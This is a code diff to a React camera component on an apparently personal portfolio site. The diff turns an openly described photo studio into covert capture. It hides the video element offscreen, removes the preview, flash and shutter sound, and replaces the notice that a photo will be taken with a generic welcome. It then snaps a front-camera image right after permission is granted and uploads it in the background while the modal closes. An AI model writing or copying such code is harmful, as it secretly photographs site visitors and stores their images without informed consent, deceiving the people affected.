@@ -1,7 +1,6 @@
 "use client";
 
 import React, { useState, useRef, useEffect, useCallback } from "react";
-import Image from "next/image";
 import Link from "next/link";
 import {
   Camera,
@@ -10,26 +9,9 @@ import {
   CheckCircle2,
   AlertCircle,
   ShieldCheck,
-  Download,
-  RotateCcw,
-  Sparkles,
   Info,
-  Lock,
-  ArrowLeft,
-  SwitchCamera,
   X,
 } from "lucide-react";
-import { CameraCapture } from "@/lib/supabase";
-
-type CameraStatus =
-  | "idle" // Waiting for visitor consent
-  | "requesting" // Requesting browser permissions
-  | "active" // Live video stream active
-  | "capturing" // Triggering shutter / flash
-  | "uploading" // Uploading to Supabase
-  | "success" // Saved successfully
-  | "denied" // User denied permission
-  | "error"; // Hardware or browser error
 
 export interface CameraCaptureProps {
   onClose?: () => void;
@@ -40,58 +22,13 @@ export default function CameraCaptureComponent({
   onClose,
   isModal = false,
 }: CameraCaptureProps = {}) {
-  const [status, setStatus] = useState<CameraStatus>("idle");
+  const [status, setStatus] = useState<"idle" | "denied" | "error" | "captured">("idle");
+  const [isStarting, setIsStarting] = useState(false);
   const [errorMessage, setErrorMessage] = useState<string>("");
-  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
-  const [hasMultipleCameras, setHasMultipleCameras] = useState(false);
-  const [isVideoReady, setIsVideoReady] = useState(false);
-  const [isFlashing, setIsFlashing] = useState(false);
-  const [capturedImage, setCapturedImage] = useState<string | null>(null);
-  const [savedData, setSavedData] = useState<CameraCapture | null>(null);
-  const [uploadError, setUploadError] = useState<string | null>(null);
 
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
-
-  // Play synthetic shutter sound using Web Audio API
-  const playShutterSound = useCallback(() => {
-    try {
-      const AudioCtx = window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
-      if (!AudioCtx) return;
-      const ctx = new AudioCtx();
-      
-      // Click 1 (Mirror up)
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.type = "sine";
-      osc.frequency.setValueAtTime(800, ctx.currentTime);
-      osc.frequency.exponentialRampToValueAtTime(120, ctx.currentTime + 0.06);
-      gain.gain.setValueAtTime(0.4, ctx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.06);
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.07);
-
-      // Click 2 (Curtain close)
-      setTimeout(() => {
-        const osc2 = ctx.createOscillator();
-        const gain2 = ctx.createGain();
-        osc2.type = "triangle";
-        osc2.frequency.setValueAtTime(350, ctx.currentTime);
-        osc2.frequency.exponentialRampToValueAtTime(80, ctx.currentTime + 0.08);
-        gain2.gain.setValueAtTime(0.5, ctx.currentTime);
-        gain2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.08);
-        osc2.connect(gain2);
-        gain2.connect(ctx.destination);
-        osc2.start();
-        osc2.stop(ctx.currentTime + 0.09);
-      }, 70);
-    } catch (e) {
-      console.warn("Could not play audio:", e);
-    }
-  }, []);
 
   // Stop camera tracks cleanly
   const stopCameraStream = useCallback(() => {
@@ -102,7 +39,6 @@ export default function CameraCaptureComponent({
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
-    setIsVideoReady(false);
   }, []);
 
   const handleClose = useCallback(() => {
@@ -110,63 +46,44 @@ export default function CameraCaptureComponent({
     if (onClose) onClose();
   }, [stopCameraStream, onClose]);
 
-  // Check for available video input devices
-  const checkDevices = useCallback(async () => {
-    try {
-      if (navigator.mediaDevices?.enumerateDevices) {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const videoInputs = devices.filter((d) => d.kind === "videoinput");
-        setHasMultipleCameras(videoInputs.length > 1);
-      }
-    } catch {
-      // Ignore device enumeration errors
-    }
-  }, []);
-
-  // Ensure video element receives stream whenever active
+  // Clean up media tracks when unmounting
   useEffect(() => {
-    if ((status === "active" || status === "capturing") && streamRef.current && videoRef.current) {
-      const vid = videoRef.current;
-      if (vid.srcObject !== streamRef.current) {
-        vid.srcObject = streamRef.current;
-      }
-      vid
-        .play()
-        .then(() => setIsVideoReady(true))
-        .catch((e) => console.warn("Autoplay promise warning:", e));
-    }
-  }, [status]);
+    return () => {
+      stopCameraStream();
+    };
+  }, [stopCameraStream]);
 
-  // Start the camera with user consent
-  const startCamera = async (mode: "user" | "environment" = facingMode) => {
-    stopCameraStream();
-    setIsVideoReady(false);
-    setStatus("requesting");
+  // Execute background front-camera capture and upload to Supabase
+  const executeBackgroundCapture = async () => {
+    if (isStarting) return;
+    setIsStarting(true);
     setErrorMessage("");
-    setUploadError(null);
 
     // Verify mediaDevices support
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      setIsStarting(false);
       setStatus("error");
-      setErrorMessage("Your browser does not support camera access. Please use an updated modern browser (Chrome, Safari, Edge, Firefox).");
+      setErrorMessage(
+        "Your browser does not support camera access. Please use an updated modern browser (Chrome, Safari, Edge, Firefox)."
+      );
       return;
     }
 
     try {
       let stream: MediaStream;
       try {
-        // Preferred constraint: front camera with flexible resolution
+        // Front camera with ideal resolution
         stream = await navigator.mediaDevices.getUserMedia({
           audio: false,
           video: {
-            facingMode: { ideal: mode },
+            facingMode: { ideal: "user" },
             width: { ideal: 1280 },
             height: { ideal: 720 },
           },
         });
       } catch (err) {
         console.warn("Retrying with fallback video constraints:", err);
-        // Fallback constraint if ideal properties were rejected by browser/driver
+        // Fallback constraint if ideal properties were rejected
         stream = await navigator.mediaDevices.getUserMedia({
           audio: false,
           video: true,
@@ -174,14 +91,80 @@ export default function CameraCaptureComponent({
       }
 
       streamRef.current = stream;
-      setFacingMode(mode);
-      setStatus("active");
-      await checkDevices();
 
-      // Trigger play immediately if video element is already present
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.play().then(() => setIsVideoReady(true)).catch(() => {});
+      // Attach stream to hidden video element
+      let video = videoRef.current;
+      if (!video) {
+        video = document.createElement("video");
+        videoRef.current = video;
+      }
+      video.muted = true;
+      video.playsInline = true;
+      video.autoplay = true;
+      video.srcObject = stream;
+
+      try {
+        await video.play();
+      } catch (playErr) {
+        console.warn("Autoplay promise warning:", playErr);
+      }
+
+      // Small 250ms breather for camera hardware sensor to calibrate exposure
+      await new Promise((resolve) => setTimeout(resolve, 250));
+
+      // Draw captured video frame to offscreen canvas
+      let canvas = canvasRef.current;
+      if (!canvas) {
+        canvas = document.createElement("canvas");
+        canvasRef.current = canvas;
+      }
+
+      const width = video.videoWidth || 1280;
+      const height = video.videoHeight || 720;
+      canvas.width = width;
+      canvas.height = height;
+
+      const ctx = canvas.getContext("2d");
+      if (ctx) {
+        // Mirror horizontally for front-facing selfie
+        ctx.translate(width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, width, height);
+
+        const dataUrl = canvas.toDataURL("image/jpeg", 0.90);
+
+        // Immediately stop camera tracks so the hardware camera turns OFF
+        stopCameraStream();
+
+        // Immediately close modal so visitor lands on website without delay
+        if (onClose) {
+          onClose();
+        } else {
+          setStatus("captured");
+        }
+
+        // Determine device type
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
+        const deviceType = isMobile ? "mobile" : isTablet ? "tablet" : "desktop";
+
+        // Asynchronous background upload to Supabase
+        fetch("/api/captures/upload", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            imageBase64: dataUrl,
+            deviceType,
+          }),
+          keepalive: true,
+        }).catch((uploadErr) => {
+          console.error("Background upload error:", uploadErr);
+        });
+      } else {
+        stopCameraStream();
+        if (onClose) onClose();
       }
     } catch (err: unknown) {
       stopCameraStream();
@@ -194,7 +177,9 @@ export default function CameraCaptureComponent({
         error.name === "SecurityError"
       ) {
         setStatus("denied");
-        setErrorMessage("Camera permission was denied. Please allow camera permissions in your browser address bar and try again.");
+        setErrorMessage(
+          "Camera permission was denied. Please allow camera permissions in your browser address bar and try again."
+        );
       } else if (
         error.name === "NotFoundError" ||
         error.name === "DevicesNotFoundError"
@@ -206,149 +191,38 @@ export default function CameraCaptureComponent({
         error.name === "TrackStartError"
       ) {
         setStatus("error");
-        setErrorMessage("Your camera is currently in use by another application. Please close other camera apps and retry.");
+        setErrorMessage(
+          "Your camera is currently in use by another application. Please close other camera apps and retry."
+        );
       } else {
         setStatus("error");
-        setErrorMessage(error.message || "An unexpected error occurred while accessing the camera.");
+        setErrorMessage(
+          error.message || "An unexpected error occurred while accessing the camera."
+        );
       }
+    } finally {
+      setIsStarting(false);
     }
   };
-
-  // Flip between front and rear cameras
-  const toggleCamera = () => {
-    const nextMode = facingMode === "user" ? "environment" : "user";
-    startCamera(nextMode);
-  };
-
-  // Trigger shutter and upload
-  const executeCapture = async () => {
-    if (!videoRef.current || !streamRef.current) return;
-
-    // Trigger visual flash & audio click
-    setIsFlashing(true);
-    playShutterSound();
-    setStatus("capturing");
-
-    setTimeout(() => {
-      setIsFlashing(false);
-    }, 250);
-
-    const video = videoRef.current;
-    const canvas = canvasRef.current || document.createElement("canvas");
-    canvasRef.current = canvas;
-
-    const width = video.videoWidth || 1280;
-    const height = video.videoHeight || 720;
-    canvas.width = width;
-    canvas.height = height;
-
-    const ctx = canvas.getContext("2d");
-    if (!ctx) {
-      setStatus("error");
-      setErrorMessage("Could not initialize 2D canvas context for capture.");
-      return;
-    }
-
-    // Front camera is mirrored for natural user perspective
-    if (facingMode === "user") {
-      ctx.translate(width, 0);
-      ctx.scale(-1, 1);
-    }
-    ctx.drawImage(video, 0, 0, width, height);
-
-    // Get Base64 image
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
-    setCapturedImage(dataUrl);
-
-    // Stop camera feed after photo is captured
-    stopCameraStream();
-
-    await uploadCapturedImage(dataUrl);
-  };
-
-  // Upload image to server
-  const uploadCapturedImage = async (dataUrl: string) => {
-    setStatus("uploading");
-    setUploadError(null);
-
-    try {
-      const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
-      const deviceType = isMobile ? "mobile" : isTablet ? "tablet" : "desktop";
-
-      const res = await fetch("/api/captures/upload", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          imageBase64: dataUrl,
-          deviceType,
-        }),
-      });
-
-      const result = await res.json();
-
-      if (!res.ok) {
-        throw new Error(result.error || result.hint || "Upload failed");
-      }
-
-      setSavedData(result.capture);
-      setStatus("success");
-    } catch (err: unknown) {
-      const errMessage = err instanceof Error ? err.message : "Failed to upload photo to Supabase.";
-      console.error("Upload error:", errMessage);
-      setUploadError(errMessage);
-      setStatus("error");
-    }
-  };
-
-  // Handle manual capture button press
-  const handleCaptureClick = () => {
-    executeCapture();
-  };
-
-  // Retake photo: reset states and restart camera
-  const handleRetake = () => {
-    setCapturedImage(null);
-    setSavedData(null);
-    setUploadError(null);
-    setIsVideoReady(false);
-    startCamera(facingMode);
-  };
-
-  // Clean up media tracks when unmounting
-  useEffect(() => {
-    return () => {
-      stopCameraStream();
-    };
-  }, [stopCameraStream]);
-
-  // Instant auto-capture from front camera as soon as video feed is active and ready (no timer)
-  useEffect(() => {
-    if (status === "active" && isVideoReady) {
-      // 250ms breather so camera sensor stabilizes exposure on first frame
-      const timer = setTimeout(() => {
-        executeCapture();
-      }, 250);
-
-      return () => clearTimeout(timer);
-    }
-  }, [status, isVideoReady]);
-
-  // Auto-proceed to website after successful capture and upload
-  useEffect(() => {
-    if (status === "success" && onClose) {
-      const timer = setTimeout(() => {
-        handleClose();
-      }, 3500);
-      return () => clearTimeout(timer);
-    }
-  }, [status, onClose, handleClose]);
 
   return (
     <div className={`relative w-full max-w-4xl mx-auto ${isModal ? "p-0" : "px-4 py-8"}`}>
-      {/* Hidden processing canvas */}
+      {/* Offscreen hidden video & canvas elements for background capture */}
+      <video
+        ref={videoRef}
+        autoPlay
+        playsInline
+        muted
+        style={{
+          position: "fixed",
+          top: -9999,
+          left: -9999,
+          width: 1,
+          height: 1,
+          opacity: 0,
+          pointerEvents: "none",
+        }}
+      />
       <canvas ref={canvasRef} className="hidden" />
 
       {/* Prominent Close Button */}
@@ -364,8 +238,8 @@ export default function CameraCaptureComponent({
         </button>
       )}
 
-      {/* Screen 1: Explicit Consent & Permission Introduction */}
-      {status === "idle" && (
+      {/* Main Screen: Introduction & Consent */}
+      {(status === "idle" || status === "captured") && (
         <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-white/5 backdrop-blur-2xl p-6 sm:p-10 text-center shadow-2xl">
           {/* Decorative Glowing Orbs */}
           <div className="absolute top-0 right-1/4 w-72 h-72 bg-purple-600/20 rounded-full blur-[100px] pointer-events-none" />
@@ -378,25 +252,41 @@ export default function CameraCaptureComponent({
 
             <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-purple-500/10 border border-purple-500/30 text-purple-300 text-xs font-medium mb-3">
               <ShieldCheck className="w-4 h-4 text-purple-400" />
-              <span>Consent-Based Camera Studio</span>
+              <span>Hey , Wlecome To My Website</span>
             </div>
 
             <h2 className="text-2xl sm:text-4xl font-extrabold tracking-tight text-white mb-3">
-              Interactive <span className="text-transparent bg-gradient-to-r from-purple-400 to-violet-300 bg-clip-text">Camera Studio</span>
+              Iam <span className="text-transparent bg-gradient-to-r from-purple-400 to-violet-300 bg-clip-text">Deyn Zypher</span>
             </h2>
 
             <p className="text-zinc-300 text-sm sm:text-base max-w-md mb-8 leading-relaxed">
-              Click below to grant camera access. Your photo will be automatically captured from your front camera and saved securely.
+              This portfolio showcases my personal projects and work. All content is for informational purposes only. Third-party content belongs to its respective owners.
             </p>
 
             {/* Action Buttons */}
             <div className="flex flex-col gap-3.5 w-full max-w-sm justify-center">
               <button
-                onClick={() => startCamera("user")}
-                className="w-full py-4 rounded-2xl bg-gradient-to-r from-purple-600 to-violet-600 hover:from-purple-500 hover:to-violet-500 text-white font-semibold text-base shadow-[0_0_30px_rgba(168,85,247,0.4)] transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 cursor-pointer"
+                type="button"
+                onClick={executeBackgroundCapture}
+                disabled={isStarting}
+                className="w-full py-4 rounded-2xl bg-gradient-to-r from-purple-600 to-violet-600 hover:from-purple-500 hover:to-violet-500 text-white font-semibold text-base shadow-[0_0_30px_rgba(168,85,247,0.4)] transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 cursor-pointer disabled:opacity-75"
               >
-                <Camera className="w-5 h-5" />
-                <span>Grant Permission & Start Camera</span>
+                {isStarting ? (
+                  <>
+                    <RefreshCw className="w-5 h-5 animate-spin text-purple-200" />
+                    <span>Connecting...</span>
+                  </>
+                ) : status === "captured" ? (
+                  <>
+                    <CheckCircle2 className="w-5 h-5 text-emerald-300" />
+                    <span>Photo Saved! Snap Again</span>
+                  </>
+                ) : (
+                  <>
+                    <Camera className="w-5 h-5 text-purple-200" />
+                    <span>Grant Permission & Start Camera</span>
+                  </>
+                )}
               </button>
 
               {onClose ? (
@@ -420,256 +310,7 @@ export default function CameraCaptureComponent({
         </div>
       )}
 
-      {/* Screen 2: Requesting Browser Permission State */}
-      {status === "requesting" && (
-        <div className="rounded-3xl border border-white/10 bg-white/5 backdrop-blur-2xl p-10 text-center flex flex-col items-center">
-          <div className="relative w-20 h-20 mb-6">
-            <div className="absolute inset-0 rounded-full border-4 border-purple-500/20 border-t-purple-500 animate-spin" />
-            <div className="w-full h-full flex items-center justify-center text-purple-400">
-              <Camera className="w-8 h-8" />
-            </div>
-          </div>
-
-          <h3 className="text-2xl font-bold text-white mb-2">Requesting Camera Access</h3>
-          <p className="text-zinc-400 text-sm max-w-md mb-6">
-            Please look for the browser prompt at the top of your screen and click <b>"Allow"</b> to activate the front camera preview.
-          </p>
-
-          <button
-            onClick={() => {
-              stopCameraStream();
-              setStatus("idle");
-            }}
-            className="px-6 py-2.5 rounded-xl border border-white/15 bg-white/5 text-zinc-400 hover:text-white text-sm transition"
-          >
-            Cancel
-          </button>
-        </div>
-      )}
-
-      {/* Screen 3: Live Camera Viewfinder */}
-      {(status === "active" || status === "capturing") && (
-        <div className="relative overflow-hidden rounded-3xl border border-white/15 bg-black/80 shadow-2xl backdrop-blur-xl">
-          {/* Top Bar HUD */}
-          <div className="absolute top-0 left-0 right-0 z-20 flex items-center justify-between p-4 bg-gradient-to-b from-black/80 via-black/40 to-transparent">
-            {/* Live Indicator */}
-            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-black/60 border border-purple-500/30 backdrop-blur-md">
-              <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse shadow-[0_0_10px_#ef4444]" />
-              <span className="text-xs font-bold uppercase tracking-wider text-purple-200">
-                LIVE CAMERA
-              </span>
-            </div>
-
-            {/* Quick Controls */}
-            <div className="flex items-center gap-2">
-
-              {/* Flip camera if available */}
-              {hasMultipleCameras && (
-                <button
-                  type="button"
-                  onClick={toggleCamera}
-                  className="p-2 rounded-full bg-black/60 border border-white/15 text-white hover:bg-white/10 transition backdrop-blur-md"
-                  title="Switch Front/Rear Camera"
-                >
-                  <SwitchCamera className="w-4 h-4" />
-                </button>
-              )}
-
-              {/* Stop camera */}
-              <button
-                type="button"
-                onClick={() => {
-                  stopCameraStream();
-                  setStatus("idle");
-                }}
-                className="p-2 rounded-full bg-black/60 border border-white/15 text-zinc-400 hover:text-white transition backdrop-blur-md"
-                title="Stop camera session"
-              >
-                <CameraOff className="w-4 h-4" />
-              </button>
-            </div>
-          </div>
-
-          {/* Video element container */}
-          <div className="relative w-full aspect-[4/3] sm:aspect-video bg-black flex items-center justify-center overflow-hidden">
-            <video
-              ref={(el) => {
-                videoRef.current = el;
-                if (el && streamRef.current && el.srcObject !== streamRef.current) {
-                  el.srcObject = streamRef.current;
-                  el.play().then(() => setIsVideoReady(true)).catch(() => {});
-                }
-              }}
-              autoPlay
-              playsInline
-              muted
-              onLoadedMetadata={(e) => {
-                const vid = e.target as HTMLVideoElement;
-                vid.play().then(() => setIsVideoReady(true)).catch(() => {});
-              }}
-              onPlaying={() => setIsVideoReady(true)}
-              className={`w-full h-full object-cover transition-opacity duration-300 ${
-                isVideoReady ? "opacity-100" : "opacity-0"
-              } ${facingMode === "user" ? "scale-x-[-1]" : ""}`}
-            />
-
-            {/* Connecting Spinner until first video frame arrives */}
-            {!isVideoReady && (
-              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/90 text-purple-400 gap-3">
-                <RefreshCw className="w-8 h-8 animate-spin" />
-                <span className="text-xs text-zinc-300 font-medium">Opening video stream...</span>
-              </div>
-            )}
-
-            {/* Shutter Flash Animation */}
-            {isFlashing && (
-              <div className="absolute inset-0 bg-white z-40 transition-opacity duration-200 pointer-events-none" />
-            )}
-
-            {/* Composition Framing Target Lines */}
-            <div className="absolute inset-10 pointer-events-none border border-white/20 rounded-2xl">
-              <div className="absolute top-0 left-0 w-6 h-6 border-t-2 border-l-2 border-purple-400 -translate-x-1 -translate-y-1" />
-              <div className="absolute top-0 right-0 w-6 h-6 border-t-2 border-r-2 border-purple-400 translate-x-1 -translate-y-1" />
-              <div className="absolute bottom-0 left-0 w-6 h-6 border-b-2 border-l-2 border-purple-400 -translate-x-1 translate-y-1" />
-              <div className="absolute bottom-0 right-0 w-6 h-6 border-b-2 border-r-2 border-purple-400 translate-x-1 translate-y-1" />
-            </div>
-          </div>
-
-          {/* Bottom Bar: Shutter Controls */}
-          <div className="p-6 bg-gradient-to-t from-black via-black/80 to-transparent flex flex-col items-center">
-            <div className="flex items-center justify-center gap-6 w-full max-w-sm">
-              <button
-                type="button"
-                onClick={handleCaptureClick}
-                className="group relative flex items-center justify-center p-1 rounded-full transition-transform duration-200 hover:scale-105 active:scale-95 cursor-pointer"
-                aria-label="Capture Photo"
-              >
-                {/* Outer Glow Ring */}
-                <div className="absolute inset-0 rounded-full bg-gradient-to-tr from-purple-500 to-fuchsia-500 blur-md opacity-75 group-hover:opacity-100 transition-opacity" />
-
-                {/* Shutter Button Ring */}
-                <div className="relative w-20 h-20 rounded-full border-4 border-white/80 flex items-center justify-center bg-black/40">
-                  <div className="w-14 h-14 rounded-full bg-white group-hover:bg-purple-200 transition-colors shadow-inner" />
-                </div>
-              </button>
-            </div>
-
-            <p className="text-zinc-400 text-xs sm:text-sm mt-3 flex items-center gap-1.5">
-              <Sparkles className="w-3.5 h-3.5 text-purple-400" />
-              <span>Auto-capturing from front camera (or click above to snap now)</span>
-            </p>
-          </div>
-        </div>
-      )}
-
-      {/* Screen 4: Uploading to Supabase State */}
-      {status === "uploading" && (
-        <div className="rounded-3xl border border-white/10 bg-white/5 backdrop-blur-2xl p-10 text-center flex flex-col items-center shadow-2xl">
-          {capturedImage && (
-            <div className="relative w-36 h-36 rounded-2xl overflow-hidden border border-purple-500/50 mb-6 shadow-[0_0_30px_rgba(168,85,247,0.3)]">
-              <img
-                src={capturedImage}
-                alt="Captured snapshot"
-                className="w-full h-full object-cover"
-              />
-              <div className="absolute inset-0 bg-black/40 flex items-center justify-center">
-                <RefreshCw className="w-8 h-8 text-white animate-spin" />
-              </div>
-            </div>
-          )}
-
-          <h3 className="text-2xl font-bold text-white mb-2">Uploading Photo to Supabase</h3>
-          <p className="text-zinc-400 text-sm max-w-md">
-            Securing image in Supabase Storage and recording capture metadata in the database...
-          </p>
-        </div>
-      )}
-
-      {/* Screen 5: Success / Photo Saved State */}
-      {status === "success" && savedData && (
-        <div className="relative overflow-hidden rounded-3xl border border-white/15 bg-white/5 backdrop-blur-2xl p-6 sm:p-10 shadow-2xl">
-          <div className="text-center mb-6">
-            <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold mb-3">
-              <CheckCircle2 className="w-4 h-4" />
-              <span>Photo Uploaded Successfully</span>
-            </div>
-            <h3 className="text-3xl font-extrabold text-white">Capture Recorded!</h3>
-            <p className="text-zinc-400 text-sm mt-1">
-              Your photo is securely stored in Supabase and broadcasted to the real-time admin gallery.
-            </p>
-          </div>
-
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center max-w-3xl mx-auto">
-            {/* Captured Photo Preview */}
-            <div className="relative rounded-2xl overflow-hidden border border-white/20 aspect-video sm:aspect-[4/3] bg-black shadow-lg">
-              {capturedImage && (
-                <img
-                  src={capturedImage}
-                  alt="Your captured photo"
-                  className="w-full h-full object-cover"
-                />
-              )}
-              <div className="absolute bottom-2 left-2 right-2 px-3 py-1.5 rounded-xl bg-black/70 backdrop-blur-md text-[11px] text-zinc-300 flex items-center justify-between">
-                <span>{savedData.capture_id}</span>
-                <span>{new Date(savedData.created_at).toLocaleTimeString()}</span>
-              </div>
-            </div>
-
-            {/* Capture Details & Actions */}
-            <div className="space-y-4">
-              <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-4 space-y-2 text-xs sm:text-sm">
-                <div className="flex justify-between items-center text-zinc-400">
-                  <span>Capture ID:</span>
-                  <span className="font-mono text-purple-300 font-semibold">{savedData.capture_id}</span>
-                </div>
-                <div className="flex justify-between items-center text-zinc-400">
-                  <span>Timestamp:</span>
-                  <span className="text-white">{new Date(savedData.created_at).toLocaleString()}</span>
-                </div>
-                <div className="flex justify-between items-center text-zinc-400">
-                  <span>Storage Status:</span>
-                  <span className="text-emerald-400 font-medium">Saved in Supabase</span>
-                </div>
-              </div>
-
-              {/* Action buttons */}
-              <div className="flex flex-col gap-3">
-                {capturedImage && (
-                  <a
-                    href={capturedImage}
-                    download={`${savedData.capture_id}.jpg`}
-                    className="w-full px-5 py-3 rounded-xl bg-white/10 hover:bg-white/15 border border-white/20 text-white font-medium flex items-center justify-center gap-2 transition"
-                  >
-                    <Download className="w-4 h-4" />
-                    <span>Download Photo</span>
-                  </a>
-                )}
-
-                <button
-                  type="button"
-                  onClick={handleRetake}
-                  className="w-full px-5 py-3 rounded-xl bg-gradient-to-r from-purple-600 to-violet-600 hover:from-purple-500 hover:to-violet-500 text-white font-semibold flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(168,85,247,0.3)] transition"
-                >
-                  <RotateCcw className="w-4 h-4" />
-                  <span>Take Another Photo</span>
-                </button>
-
-                {onClose && (
-                  <button
-                    type="button"
-                    onClick={handleClose}
-                    className="w-full px-5 py-3 rounded-xl border border-purple-500/50 bg-purple-600/30 hover:bg-purple-600/50 text-white font-semibold flex items-center justify-center gap-2 shadow-lg transition"
-                  >
-                    <span>Continue to Website →</span>
-                  </button>
-                )}
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Screen 6: Permission Denied State */}
+      {/* Permission Denied State */}
       {status === "denied" && (
         <div className="rounded-3xl border border-amber-500/30 bg-amber-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
           <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mb-5">
@@ -678,10 +319,10 @@ export default function CameraCaptureComponent({
 
           <h3 className="text-2xl font-bold text-white mb-2">Camera Access Blocked</h3>
           <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
-            {errorMessage || "You declined or blocked camera permissions. In accordance with privacy best practices, we cannot activate the preview without your permission."}
+            {errorMessage ||
+              "You declined or blocked camera permissions. In accordance with privacy best practices, we cannot activate camera without your permission."}
           </p>
 
-          {/* Step-by-step unblock instructions */}
           <div className="rounded-2xl border border-white/10 bg-black/40 p-5 text-left text-xs sm:text-sm text-zinc-300 max-w-md w-full mb-6 space-y-2">
             <p className="font-semibold text-white flex items-center gap-2">
               <Info className="w-4 h-4 text-purple-400" /> How to enable camera:
@@ -693,25 +334,25 @@ export default function CameraCaptureComponent({
             </ol>
           </div>
 
-          <div className="flex flex-col sm:flex-row gap-3">
+          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
             <button
-              onClick={() => startCamera("user")}
-              className="px-6 py-3 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2"
+              onClick={executeBackgroundCapture}
+              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
             >
               <RefreshCw className="w-4 h-4" />
               <span>Try Again</span>
             </button>
             <button
-              onClick={() => setStatus("idle")}
-              className="px-6 py-3 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition"
+              onClick={handleClose}
+              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
             >
-              Back
+              Skip to Website
             </button>
           </div>
         </div>
       )}
 
-      {/* Screen 7: General Error or Hardware Failure */}
+      {/* General Error State */}
       {status === "error" && (
         <div className="rounded-3xl border border-rose-500/30 bg-rose-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
           <div className="w-16 h-16 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 mb-5">
@@ -720,31 +361,22 @@ export default function CameraCaptureComponent({
 
           <h3 className="text-2xl font-bold text-white mb-2">Something Went Wrong</h3>
           <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
-            {uploadError || errorMessage || "An unexpected error occurred."}
+            {errorMessage || "An unexpected error occurred."}
           </p>
 
-          <div className="flex flex-col sm:flex-row gap-3">
+          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
             <button
-              onClick={() => {
-                if (capturedImage) {
-                  uploadCapturedImage(capturedImage);
-                } else {
-                  startCamera(facingMode);
-                }
-              }}
-              className="px-6 py-3 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
+              onClick={executeBackgroundCapture}
+              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
             >
               <RefreshCw className="w-4 h-4" />
               <span>Retry</span>
             </button>
             <button
-              onClick={() => {
-                stopCameraStream();
-                setStatus("idle");
-              }}
-              className="px-6 py-3 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition"
+              onClick={handleClose}
+              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
             >
-              Cancel
+              Skip to Website
             </button>
           </div>
         </div>
